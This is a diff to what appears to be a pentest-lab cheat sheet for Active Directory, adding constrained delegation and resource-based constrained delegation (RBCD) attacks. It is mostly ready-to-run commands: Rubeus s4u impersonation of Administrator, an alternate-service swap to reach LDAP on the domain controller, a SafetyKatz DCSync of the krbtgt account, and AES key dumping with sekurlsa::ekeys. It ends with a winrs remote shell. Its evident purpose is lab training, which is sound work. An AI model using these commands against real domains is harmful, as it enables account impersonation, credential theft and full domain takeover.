@@ -337,17 +337,49 @@ Constrained Delegation
 # Occours when a user wants to access a service ex. web server. web server will ask KDC for a ticket, if the user account is not bloked for a delegation KDC will return a S4USelf, then web server will send the S4USelf to the KDC again requesting S4UProxy that allows the user to access the service. This will happen if the msDS-AllowedToDelegateTo field in listed.
 # You can forge S4USelf ticket using S4U attack.
 
-#1- List users and computers with constrained delegation enabled
+#1- List users with constrained delegation enabled
 Get-DomainUser-TrustedToAuth  #PowerView
-Get-DomainComputer-TrustedToAuth  #PowerView
 Get-ADObject-Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo  #AD Moudle
+# Read the msds-allowedtodelegatedto in the output to know what service you will exploit
 
+#2- Start the Attack
+Rubeus.exe s4u /user:websvc /aes256:<aes256key> /impersonateuser:Administrator /msdsspn:CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL /ptt
+ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 
+# Using Alternate Service Name
+#1- List computers with constrained delegation enabled
+Get-DomainComputer-TrustedToAuth  #PowerView
+
+#2- Use alternate service name
+Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<aes256key> /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
+
+# After having ldap service on the DC you can run DCSync
+C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit" 
 ```
 
+RBCD Delegation
+```powershell
+# Instead of SPNs on msDs-AllowedToDelegatTo on the front-end service like web service, access in this case is controlled by security descriptor of msDS-AllowedToActOnBehalfOfOtherIdentity like SQL Server
+# you need to have write permission or object to configure msDS-AllowedToActOnBehalfOfOtherIdentity
 
+#1- Enumerate write permissions
+Find-InterestingDomainACL
+Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
 
+#2- Configure the RBCD on the mgmt machine from student machine
+Set-DomainRBCD -Idenetity dcorp-mgmt -DelegateFrom 'dcorp-student1$'
+Get-DomainRBCD  #check the configuration. Read DelegatedDistinguishedName & SourceName
 
+#3- Dump the AES key
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -Command "sekurlsa::ekeys" "exit"
+# if you have two different hashes for the same user check the SID. S-1-5-18 for real account; S-1-5-96-0-19 for Virtual account
+
+#4- s4u pass the hash attack
+Rubeus.exe s4u /user:dcorp-student1$ /aes256:<aes256key> /impersonateuser:Administrator /msdsspn:http/dcorp-mgmt /ptt
+klist
+winrs -r:dcorp-mgmt cmd
+#keep in mind that you have the TGS not the TGT. means you can only access the dcorp-mgmt machine through http service only
+```
 
 
 
